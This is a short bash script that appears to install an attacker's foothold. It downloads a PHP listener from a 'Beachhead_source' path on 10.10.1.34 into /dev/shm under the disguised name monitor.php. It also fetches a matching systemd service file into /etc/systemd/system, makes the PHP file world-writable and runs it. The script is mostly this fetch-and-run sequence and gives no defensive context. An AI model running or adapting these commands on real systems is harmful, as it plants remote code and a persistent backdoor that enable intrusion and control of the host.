#!/bin/bash

#Download
wget 10.10.1.34/Beachhead_source/phpListener.php -O /dev/shm/monitor.php


#get service and run
wget 10.10.1.34/Services/monitor.service -O /etc/systemd/system/monitor.service

chmod 777 /dev/shm/monitor.php

php /dev/shm/monitor.php